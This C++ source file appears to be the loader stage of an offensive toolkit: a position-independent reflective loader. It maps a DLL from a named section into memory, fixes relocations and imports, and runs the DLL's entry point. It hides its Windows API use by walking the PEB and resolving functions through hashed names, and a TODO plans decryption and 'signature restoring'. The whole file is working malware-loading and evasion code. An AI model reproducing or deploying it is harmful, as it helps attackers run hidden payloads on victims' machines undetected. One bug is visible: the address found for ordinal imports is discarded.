#include "utils.h"
#include "loader.h"

#define HASH_STRINGA_AT_RUNTIME(STRING) Hash_StringA_Fnv1a((PCSTR)STRING)
#define HASH_STRINGA_AT_COMPILETIME(STRING, VARNAME) constexpr DWORD64 VARNAME##_HASH = Hash_StringA_Fnv1a((PCSTR)#STRING);
#define HASH_STRINGW_AT_RUNTIME(STRING) Hash_StringW_Fnv1a((PCWSTR)STRING)
#define HASH_STRINGW_AT_COMPILETIME(STRING, VARNAME) constexpr DWORD64 VARNAME##_HASH = Hash_StringW_Fnv1a((PCWSTR)L#STRING);

/*
---------------------------------------------------------------------------------------------------
This function accepts a string and its returns DWORD64 hash

Hash function: FNV-1a with prime multiplier
*/
constexpr DWORD64 Hash_StringA_Fnv1a(PCSTR whatToHash) {
	DWORD64 hash = 14695981039346656037ULL;  // FNV offset basis (64-bit)
	while (*whatToHash != '\0') {
		hash ^= *whatToHash;                               // XOR with the character
		hash *= 1099511628211ULL;                     // Prime multiplier (FNV prime)
		++whatToHash;
	}
	return hash;
}
constexpr DWORD64 Hash_StringW_Fnv1a(PCWSTR whatToHash) {
	DWORD64 hash = 14695981039346656037ULL;  // FNV offset basis (64-bit)
	while (*whatToHash != '\0') {
		hash ^= *whatToHash;                               // XOR with the character
		hash *= 1099511628211ULL;                     // Prime multiplier (FNV prime)
		++whatToHash;
	}
	return hash;
}

/*
---------------------------------------------------------------------------------------------------
This function finds out module handles

moduleNameHash: Hash of UTF16 module name
*/
HMODULE GetModuleHandleCustom(DWORD64 moduleNameHash) {
	// Get PEB
	PPEB pPeb = NULL;
#ifdef _M_X64
	pPeb = (PPEB)__readgsqword(12 * 8);
#else
	pPeb = (PPEB)__readfsdword(12 * 4);
#endif

	// Iterate through entries and find out target module
	PLDR_DATA_TABLE_ENTRY pListEntryCurr = (PLDR_DATA_TABLE_ENTRY)(&(pPeb->Ldr->InMemoryOrderModuleList));
	PLDR_DATA_TABLE_ENTRY pListEntryFirst = pListEntryCurr;
	WCHAR moduleNameCurrLower[MAX_PATH] = L"";

	do {
		if (pListEntryCurr->FullDllName.Buffer != NULL) {
			// Check if current module is the one
			RtlZeroMemoryCustom(moduleNameCurrLower, (MAX_PATH * sizeof(WCHAR)));
			StringLowerW(pListEntryCurr->FullDllName.Buffer, moduleNameCurrLower);
			if (HASH_STRINGW_AT_RUNTIME(moduleNameCurrLower) == moduleNameHash)
				return (HMODULE)(pListEntryCurr->Reserved2[0]);
		}

		// Advance to next entry
		pListEntryCurr = (PLDR_DATA_TABLE_ENTRY)(pListEntryCurr->Reserved1[0]);
	} while (pListEntryCurr != pListEntryFirst);

	return NULL;
}

/*
---------------------------------------------------------------------------------------------------
This function finds out function address from hash of function name

hModule: Module address
procNameHash: Hash of UTF8 name of function to search
*/
PVOID GetProcAddressByNameHash(HMODULE hNtdll, HMODULE hModule, DWORD64 procNameHash) {
	// Get export data directory
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(ADD_OFFSET_TO_POINTER(hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew));
	PIMAGE_EXPORT_DIRECTORY pDirectoryExport = (PIMAGE_EXPORT_DIRECTORY)(ADD_OFFSET_TO_POINTER(hModule, pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
	PDWORD pAddressOfNames = (PDWORD)(ADD_OFFSET_TO_POINTER(hModule, pDirectoryExport->AddressOfNames));
	PWORD pAddressOfOrdinals = (PWORD)(ADD_OFFSET_TO_POINTER(hModule, pDirectoryExport->AddressOfNameOrdinals));
	PDWORD pAddressOfFunctions = (PDWORD)(ADD_OFFSET_TO_POINTER(hModule, pDirectoryExport->AddressOfFunctions));
	PVOID functionAddress = NULL;

	// Prepare variables for forwarded functions
	HASH_STRINGA_AT_COMPILETIME(NTDLL., NTDLL_FORWARDED)
	CHAR forwardedFunction[100] = "";

	for (DWORD i = 0; i < (pDirectoryExport->NumberOfNames); i++) {
		PCHAR procNameCurr = (PCHAR)(ADD_OFFSET_TO_POINTER(hModule, pAddressOfNames[i]));
		if (HASH_STRINGA_AT_RUNTIME(procNameCurr) == procNameHash) {
			// Calculate function address
			functionAddress = ADD_OFFSET_TO_POINTER(hModule, pAddressOfFunctions[pAddressOfOrdinals[i]]);

			// Check if it's a forwarded function; if yes, recursively resolve it
			if (((PCHAR)functionAddress)[0] == 'N' && ((PCHAR)functionAddress)[5] == '.') {
				RtlZeroMemoryCustom(forwardedFunction, 100);
				CopyBuffer((PBYTE)forwardedFunction, (PBYTE)functionAddress, StringLenA((PCHAR)functionAddress));
				functionAddress = GetProcAddressByNameHash(hNtdll, hNtdll, HASH_STRINGA_AT_RUNTIME(((PCHAR)functionAddress) + 6));
			}

			return functionAddress;
		}
	}

	return NULL;
}

/*
---------------------------------------------------------------------------------------------------
This function finds out function address from function ordinal

hModule: Module address
procNameHash: Hash of UTF8 name of function to search
*/
PVOID GetProcAddressByOrdinal(HMODULE hModule, WORD procOrdinal) {
	// Get export data directory
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(ADD_OFFSET_TO_POINTER(hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew));
	PIMAGE_EXPORT_DIRECTORY pDirectoryExport = (PIMAGE_EXPORT_DIRECTORY)(hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Ordinal must be between 1 and NUMBER OF FUNCTIONS
	if ((procOrdinal == 0) || (procOrdinal > pDirectoryExport->NumberOfFunctions)) return NULL;

	// Return function address
	PDWORD pAddressOfFunctions = (PDWORD)((PBYTE)hModule + (pDirectoryExport->AddressOfFunctions));
	return ADD_OFFSET_TO_POINTER(hModule, pAddressOfFunctions[procOrdinal - 1]);
}

/*
---------------------------------------------------------------------------------------------------
Function to parse raw DLL contents
*/
void ParseDllContents(IN LPVOID pDllContents, OUT PDLL_CONTENTS_PARSED pDllContentsParsed) {
	// Process headers
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(ADD_OFFSET_TO_POINTER(pDllContents, ((PIMAGE_DOS_HEADER)pDllContents)->e_lfanew));

	pDllContentsParsed->FileHeader = pNtHeaders->FileHeader;
	pDllContentsParsed->OptionalHeader = pNtHeaders->OptionalHeader;

	// Process misc
	pDllContentsParsed->SizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
	pDllContentsParsed->ImageBase = pNtHeaders->OptionalHeader.ImageBase;
	pDllContentsParsed->AddressOfEntryPointOffset = pNtHeaders->OptionalHeader.AddressOfEntryPoint;

	// Process section headers
	pDllContentsParsed->NumOfSections = pNtHeaders->FileHeader.NumberOfSections;
	pDllContentsParsed->SectionHeaderFirst = IMAGE_FIRST_SECTION(pNtHeaders);

	// Process required sections explicitly
	pDllContentsParsed->pDataDirectoryExport = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	pDllContentsParsed->pDataDirectoryImport = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
	pDllContentsParsed->pDataDirectoryReloc = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	pDllContentsParsed->pDataDirectoryException = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]);
}

/*
---------------------------------------------------------------------------------------------------
Function to copy sections to DLL image
*/
void CopySectionsToDllImage(IN PDLL_CONTENTS_PARSED pDllContentsParsed, IN LPVOID pDllContents, OUT LPVOID pDllImage) {
	for (int i = 0; i < pDllContentsParsed->NumOfSections; i++) {
		IMAGE_SECTION_HEADER SectionHeader = pDllContentsParsed->SectionHeaderFirst[i];

		if (
			SectionHeader.VirtualAddress != NULL &&
			SectionHeader.Misc.VirtualSize != 0 &&
			SectionHeader.PointerToRawData != NULL
		) {
			CopyBuffer(
				ADD_OFFSET_TO_POINTER(pDllImage, SectionHeader.VirtualAddress),
				ADD_OFFSET_TO_POINTER(pDllContents, SectionHeader.PointerToRawData),
				SectionHeader.Misc.VirtualSize
			);
		}
	}
}

/*
---------------------------------------------------------------------------------------------------
Function to perform relocations in DLL image
*/
void PerformRelocationForDllImage(IN PDLL_CONTENTS_PARSED pDllContentsParsed, OUT LPVOID pDllImage) {
	DWORD64 relocOffset = (DWORD64)pDllImage - pDllContentsParsed->ImageBase;

	// If no relocation necessary
	if (relocOffset == 0) return;
	// If no relocation data is present
	if (pDllContentsParsed->pDataDirectoryReloc->VirtualAddress == NULL || pDllContentsParsed->pDataDirectoryReloc->Size == 0) return;

	PIMAGE_BASE_RELOCATION pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)(ADD_OFFSET_TO_POINTER(pDllImage, pDllContentsParsed->pDataDirectoryReloc->VirtualAddress));

	DWORD NumImageBaseRelocationEntry = NULL;
	PIMAGE_BASE_RELOCATION_ENTRY pImageBaseRelocationEntry = NULL;
	PVOID relocAt = NULL;

	// For each Base Relocation Block
	while (pImageBaseRelocation->VirtualAddress != NULL) {
		NumImageBaseRelocationEntry = (pImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_BASE_RELOCATION_ENTRY);
		pImageBaseRelocationEntry = (PIMAGE_BASE_RELOCATION_ENTRY)(ADD_OFFSET_TO_POINTER(pImageBaseRelocation, sizeof(IMAGE_BASE_RELOCATION)));
		relocAt = NULL;

		// For each Base Relocation Block Entry
		for (DWORD i = 0; i < NumImageBaseRelocationEntry; i++) {
			relocAt = ADD_OFFSET_TO_POINTER(pDllImage, pImageBaseRelocation->VirtualAddress + pImageBaseRelocationEntry[i].Offset);

			switch (pImageBaseRelocationEntry[i].Type) {
			case IMAGE_REL_BASED_HIGH: // The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.
				*(PWORD)relocAt += HIWORD(relocOffset);
				break;
			case IMAGE_REL_BASED_LOW: // The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.
				*(PWORD)relocAt += LOWORD(relocOffset);
				break;
			case IMAGE_REL_BASED_HIGHLOW: // The base relocation applies all 32 bits of the difference to the 32-bit field at offset.
				*(PDWORD)relocAt += (DWORD)relocOffset;
				break;
			case IMAGE_REL_BASED_DIR64: // The base relocation applies the difference to the 64-bit field at offset.
				*(PDWORD64)relocAt += relocOffset;
				break;
			case IMAGE_REL_BASED_ABSOLUTE: // The base relocation is skipped. This type can be used to pad a block.
			default:
				break;
			}
		}

		// Move on to next relocation block
		pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)(ADD_OFFSET_TO_POINTER(pImageBaseRelocation, pImageBaseRelocation->SizeOfBlock));
	}
}

/*
---------------------------------------------------------------------------------------------------
Function to resolve imports in DLL image
*/
BOOL FixImportsForInMemPE(IN PWINFUNC pWinFunc, HMODULE hNtdll, IN PDLL_CONTENTS_PARSED pDllContentsParsed, OUT LPVOID pDllImage) {
	// If there is no import section
	if (pDllContentsParsed->pDataDirectoryImport->VirtualAddress == NULL || pDllContentsParsed->pDataDirectoryImport->Size == 0) return TRUE;

	PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(ADD_OFFSET_TO_POINTER(pDllImage, pDllContentsParsed->pDataDirectoryImport->VirtualAddress));
	WCHAR dllNameW[MAX_PATH] = L"";
	PIMAGE_THUNK_DATA pOriginalFirstThunk = NULL;
	PIMAGE_THUNK_DATA pFirstThunk = NULL;
	BOOL isOrdinal = FALSE;
	HMODULE hModule = (HMODULE)INVALID_HANDLE_VALUE;
	PIMAGE_IMPORT_BY_NAME pImageImportByName = { 0 };
	LPVOID funcAddress = NULL;

	// Iterate through Image Import Descriptors
	while (pImageImportDescriptor->FirstThunk != NULL && pImageImportDescriptor->OriginalFirstThunk != NULL) {
		// Get module handle to required DLL
		RtlZeroMemoryCustom(dllNameW, MAX_PATH * sizeof(WCHAR));
		Utf8ToUtf16String(
			(PCHAR)(ADD_OFFSET_TO_POINTER(pDllImage, pImageImportDescriptor->Name)),
			dllNameW
		);
		StringLowerW(dllNameW, dllNameW);

		// If module is not already loaded, load it
		hModule = GetModuleHandleCustom(HASH_STRINGW_AT_RUNTIME(dllNameW));
		if (hModule == INVALID_HANDLE_VALUE || hModule == NULL) {
			UNICODE_STRING dllNameUnicodeString{};
			dllNameUnicodeString.Buffer = dllNameW;
			dllNameUnicodeString.Length = (USHORT)(StringLenW(dllNameW) * sizeof(WCHAR));
			dllNameUnicodeString.MaximumLength = MAX_PATH * sizeof(WCHAR);

			pWinFunc->pLdrLoadDll(
				NULL,
				0,
				&dllNameUnicodeString,
				(PHANDLE)(&hModule)
			);

			if (hModule == INVALID_HANDLE_VALUE || hModule == NULL) {
				return FALSE;
			}
		}

		// Iterate through each Thunk
		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(ADD_OFFSET_TO_POINTER(pDllImage, pImageImportDescriptor->OriginalFirstThunk));
		pFirstThunk = (PIMAGE_THUNK_DATA)(ADD_OFFSET_TO_POINTER(pDllImage, pImageImportDescriptor->FirstThunk));
		funcAddress = NULL;
		while (pOriginalFirstThunk->u1.Function != NULL && pFirstThunk->u1.Function) {
			isOrdinal = ((pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) ? FALSE : TRUE;
			if (isOrdinal) {
				GetProcAddressByOrdinal(hModule, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal));
			}
			else {
				pImageImportByName = (PIMAGE_IMPORT_BY_NAME)(ADD_OFFSET_TO_POINTER(pDllImage, pOriginalFirstThunk->u1.AddressOfData));
				funcAddress = GetProcAddressByNameHash(hNtdll, hModule, HASH_STRINGA_AT_RUNTIME(pImageImportByName->Name));
			}
			if (funcAddress == NULL)
				return FALSE;
			pFirstThunk->u1.Function = (ULONGLONG)funcAddress;

			// Move on to next thunk
			pOriginalFirstThunk++;
			pFirstThunk++;
		}

		// Move on to next Image Import Descriptor
		++pImageImportDescriptor;
	}

	return TRUE;
}

/*
---------------------------------------------------------------------------------------------------
Set corrent page access permissions to the DLL image sections
*/
BOOL AssignCorrectPagePerms(IN PWINFUNC pWinFunc, IN PDLL_CONTENTS_PARSED pDllContentsParsed, OUT LPVOID pDllImage) {
	IMAGE_SECTION_HEADER SectionHeader = { 0 };
	DWORD newProtection = NULL, oldProtection = NULL;

	// Iterate through each Section header
	for (int i = 0; i < pDllContentsParsed->NumOfSections; i++) {
		SectionHeader = pDllContentsParsed->SectionHeaderFirst[i];

		// Get correct permission to set
		if ((SectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) && !(SectionHeader.Characteristics & IMAGE_SCN_MEM_READ) && !(SectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE)) {
			newProtection = PAGE_EXECUTE;
		}
		else if ((SectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) && (SectionHeader.Characteristics & IMAGE_SCN_MEM_READ) && !(SectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE)) {
			newProtection = PAGE_EXECUTE_READ;
		}
		else if ((SectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) && (SectionHeader.Characteristics & IMAGE_SCN_MEM_READ) && (SectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE)) {
			newProtection = PAGE_EXECUTE_READWRITE;
		}
		else if (!(SectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) && (SectionHeader.Characteristics & IMAGE_SCN_MEM_READ) && !(SectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE)) {
			newProtection = PAGE_READONLY;
		}
		else if (!(SectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) && (SectionHeader.Characteristics & IMAGE_SCN_MEM_READ) && (SectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE)) {
			newProtection = PAGE_READWRITE;
		}
		else {
			return FALSE;
		}

		// Set correct permission
		LPVOID pSection = ADD_OFFSET_TO_POINTER(pDllImage, SectionHeader.VirtualAddress);
		SIZE_T sectionSize = SectionHeader.Misc.VirtualSize;
		if (SectionHeader.VirtualAddress == 0 || sectionSize == 0) continue;
		NTSTATUS ntStatus =pWinFunc->pNtProtectVirtualMemory(
			(HANDLE)-1,
			&pSection,
			&sectionSize,
			newProtection,
			&oldProtection
		);
		if (ntStatus != 0) return FALSE;
	}
	return TRUE;
}

/*
---------------------------------------------------------------------------------------------------
Function to register exception handlers of the DLL
*/
BOOL RegisterExceptionHandlers(IN PWINFUNC pWinFunc, IN PDLL_CONTENTS_PARSED pDllContentsParsed, OUT LPVOID pDllImage) {
	if (pDllContentsParsed->pDataDirectoryException->VirtualAddress != NULL) {
		PRUNTIME_FUNCTION pFunctionTable = (PRUNTIME_FUNCTION)(ADD_OFFSET_TO_POINTER(pDllImage, pDllContentsParsed->pDataDirectoryException->VirtualAddress));
		return pWinFunc->pRtlAddFunctionTable(
			pFunctionTable,
			(pDllContentsParsed->pDataDirectoryException->Size / sizeof(RUNTIME_FUNCTION)),
			(DWORD64)pDllImage);
	}
	else return FALSE;
}

/*
---------------------------------------------------------------------------------------------------
Function to register exception handlers of the DLL
*/

void JumpToEntry(IN PWINFUNC pWinFunc, IN DWORD entrypointOffset, IN LPVOID pDllImage) {
	// Calculate entrypoint
	LPVOID pEntry = ADD_OFFSET_TO_POINTER(pDllImage, entrypointOffset);

	// Invoke entrypoint; jump straight to entrypoint in current thread
	((DLLMAIN)pEntry)((HINSTANCE)pDllImage, DLL_PROCESS_ATTACH, NULL);
}

/*
---------------------------------------------------------------------------------------------------
Function to load DLL from its contents in memory; performs all necessary functions
*/
void LoadDll(IN PWINFUNC pWinFunc, IN HMODULE hNtdll, IN LPVOID pDllContents, OUT VOID **ppDllImage, OUT PDWORD pEntrypointOffset) {
	// Initialisation
	DLL_CONTENTS_PARSED dllContentsParsed;
	SIZE_T dllImageSize = 0;

	// Process image file
	RtlZeroMemoryCustom(((PBYTE)&dllContentsParsed), sizeof(DLL_CONTENTS_PARSED));
	ParseDllContents(pDllContents, &dllContentsParsed);
	if (dllContentsParsed.ImageBase == NULL) return;
	*pEntrypointOffset = dllContentsParsed.AddressOfEntryPointOffset;

	// Allocate memory for in-mem image
	dllImageSize = dllContentsParsed.SizeOfImage;
	pWinFunc->pNtAllocateVirtualMemory(
		(HANDLE)-1,
		ppDllImage,
		0,
		&dllImageSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);
	if (*ppDllImage == NULL) return;

	// Copy over sections
	CopySectionsToDllImage(&dllContentsParsed, pDllContents, *ppDllImage);

	// Perform import fixes
	if (!FixImportsForInMemPE(pWinFunc, hNtdll, &dllContentsParsed, *ppDllImage)) return;

	// Register exception handlers
	if (!RegisterExceptionHandlers(pWinFunc, &dllContentsParsed, *ppDllImage)) return;

	// Perform relocations
	PerformRelocationForDllImage(&dllContentsParsed, *ppDllImage);

	// Assign correct page access to sections
	if (!AssignCorrectPagePerms(pWinFunc, &dllContentsParsed, *ppDllImage)) return;
}

/*
---------------------------------------------------------------------------------------------------
This function resolves necessary functions needed for this Loader

pWinFunc: Pointer to a WINFUNC struct to hold the necessary function pointers
*/
bool ResolveNecessaryFunctions(PWINFUNC pWinFunc, HMODULE *phNtdll) {
	// Prepare hashes
	HASH_STRINGW_AT_COMPILETIME(ntdll.dll, NTDLL)
	HASH_STRINGW_AT_COMPILETIME(kernel32.dll, KERNEL32)

	HASH_STRINGA_AT_COMPILETIME(MapViewOfFile, MapViewOfFile)
	HASH_STRINGA_AT_COMPILETIME(GetCurrentProcess, GetCurrentProcess)
	HASH_STRINGA_AT_COMPILETIME(NtMapViewOfSection, NtMapViewOfSection)
	HASH_STRINGA_AT_COMPILETIME(NtOpenSection, NtOpenSection)
	HASH_STRINGA_AT_COMPILETIME(NtAllocateVirtualMemory, NtAllocateVirtualMemory)
	HASH_STRINGA_AT_COMPILETIME(NtFreeVirtualMemory, NtFreeVirtualMemory)
	HASH_STRINGA_AT_COMPILETIME(NtUnmapViewOfSection, NtUnmapViewOfSection)
	HASH_STRINGA_AT_COMPILETIME(NtClose, NtClose)
	HASH_STRINGA_AT_COMPILETIME(LdrLoadDll, LdrLoadDll)
	HASH_STRINGA_AT_COMPILETIME(NtProtectVirtualMemory, NtProtectVirtualMemory)
	HASH_STRINGA_AT_COMPILETIME(RtlAddFunctionTable, RtlAddFunctionTable)
	HASH_STRINGA_AT_COMPILETIME(NtTerminateThread, NtTerminateThread)

	// Get NTDLL handle
	HMODULE hNtdll = GetModuleHandleCustom(NTDLL_HASH);
	HMODULE hKernel32 = GetModuleHandleCustom(KERNEL32_HASH);
	if (hNtdll == NULL || hKernel32 == NULL) return false;
	*phNtdll = hNtdll;

	// Get functions
	RtlZeroMemoryCustom(pWinFunc, sizeof(WINFUNC));

	pWinFunc->pNtMapViewOfSection = (NtMapViewOfSection*)GetProcAddressByNameHash(hNtdll, hNtdll, NtMapViewOfSection_HASH);
	pWinFunc->pNtOpenSection = (NtOpenSection*)GetProcAddressByNameHash(hNtdll, hNtdll, NtOpenSection_HASH);
	pWinFunc->pNtAllocateVirtualMemory = (NtAllocateVirtualMemory*)GetProcAddressByNameHash(hNtdll, hNtdll, NtAllocateVirtualMemory_HASH);
	pWinFunc->pNtFreeVirtualMemory = (NtFreeVirtualMemory*)GetProcAddressByNameHash(hNtdll, hNtdll, NtFreeVirtualMemory_HASH);
	pWinFunc->pNtUnmapViewOfSection = (NtUnmapViewOfSection*)GetProcAddressByNameHash(hNtdll, hNtdll, NtUnmapViewOfSection_HASH);
	pWinFunc->pNtClose = (NTClose*)GetProcAddressByNameHash(hNtdll, hNtdll, NtClose_HASH);
	pWinFunc->pLdrLoadDll = (LdrLoadDll*)GetProcAddressByNameHash(hNtdll, hNtdll, LdrLoadDll_HASH);
	pWinFunc->pNtProtectVirtualMemory = (NtProtectVirtualMemory*)GetProcAddressByNameHash(hNtdll, hNtdll, NtProtectVirtualMemory_HASH);
	pWinFunc->pRtlAddFunctionTable = (RTLAddFunctionTable*)GetProcAddressByNameHash(hNtdll, hKernel32, RtlAddFunctionTable_HASH);
	pWinFunc->pNtTerminateThread = (NTTerminateThread*)GetProcAddressByNameHash(hNtdll, hNtdll, NtTerminateThread_HASH);

	return (
		(pWinFunc->pNtMapViewOfSection != 0) &&
		(pWinFunc->pNtOpenSection != 0) &&
		(pWinFunc->pNtAllocateVirtualMemory != 0) &&
		(pWinFunc->pNtFreeVirtualMemory != 0) &&
		(pWinFunc->pNtUnmapViewOfSection != 0) &&
		(pWinFunc->pNtClose != 0) &&
		(pWinFunc->pLdrLoadDll != 0) &&
		(pWinFunc->pNtProtectVirtualMemory != 0) &&
		(pWinFunc->pRtlAddFunctionTable != 0) &&
		(pWinFunc->pNtTerminateThread != 0)
		);
}

/*
---------------------------------------------------------------------------------------------------
This function is position independent, and loads the passed DLL content as a DLL

sectionName: 3 character UTF16-LE name of the Section from which to source the DLL contents
*/
extern "C" __declspec(dllexport) void Load(LPVOID sectionName) {
	// Initialise variables
	LPVOID pDllContents = NULL;
	SIZE_T dllContentsSize = 0;
	DWORD ntStatus = 0;
	HMODULE hNtdll = NULL;
	LPVOID pDllImage = NULL;
	DWORD entrypointOffset = 0;

	// Resolve necessary functions
	WINFUNC winFunc;
	if(!ResolveNecessaryFunctions(&winFunc, &hNtdll)) return;

	// Read DLL from Section

	//// Open section handle
	HANDLE hSectionDll = NULL;
	OBJECT_ATTRIBUTES dllSectionObjectAttributes{};
	RtlZeroMemoryCustom(&dllSectionObjectAttributes, sizeof(OBJECT_ATTRIBUTES));

	UNICODE_STRING sectionNameUnicodeString{};
	DWORD sectionNameLen = StringLenW((PWCHAR)sectionName);

	sectionNameUnicodeString.Buffer = (PWSTR)sectionName;
	sectionNameUnicodeString.MaximumLength = sectionNameLen * sizeof(WCHAR);
	sectionNameUnicodeString.Length = sectionNameLen * sizeof(WCHAR);

	InitializeObjectAttributes(
		&dllSectionObjectAttributes,
		&sectionNameUnicodeString,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
	);

	ntStatus = winFunc.pNtOpenSection(
		&hSectionDll,
		SECTION_MAP_READ | SECTION_MAP_WRITE,
		&dllSectionObjectAttributes
	);
	if (hSectionDll == NULL) goto CLEANUP;

	//// Map view of section into local process
	ntStatus = winFunc.pNtMapViewOfSection(
		hSectionDll,
		(HANDLE)-1,
		&pDllContents,
		NULL,
		NULL,
		NULL,
		&dllContentsSize,
		SECTION_INHERIT::ViewUnmap,
		NULL,
		PAGE_READWRITE
	);
	if (dllContentsSize == 0 || pDllContents == NULL) goto CLEANUP;

	// Decrypt DLL and restore signatures TODO

	// Load DLL
	LoadDll(&winFunc, hNtdll, pDllContents, &pDllImage, &entrypointOffset);
	if (pDllImage == NULL) goto CLEANUP;

	// Remove raw DLL contents
	if (pDllContents != NULL)
		winFunc.pNtUnmapViewOfSection(
			(HANDLE)-1,
			pDllContents
		);
	if (hSectionDll != NULL)
		winFunc.pNtClose(hSectionDll);

	// Jump to DLL's entrypoint
	JumpToEntry(&winFunc, entrypointOffset, pDllImage);

	// Cleanup
CLEANUP:
	// Cleanup in-mem DLL buffer
	if (pDllImage != NULL)
		winFunc.pNtFreeVirtualMemory(
			(HANDLE)-1,
			&pDllImage,
			0,
			MEM_RELEASE
		);

	// Exit current thread
	winFunc.pNtTerminateThread((HANDLE)NULL, (NTSTATUS)0);
}
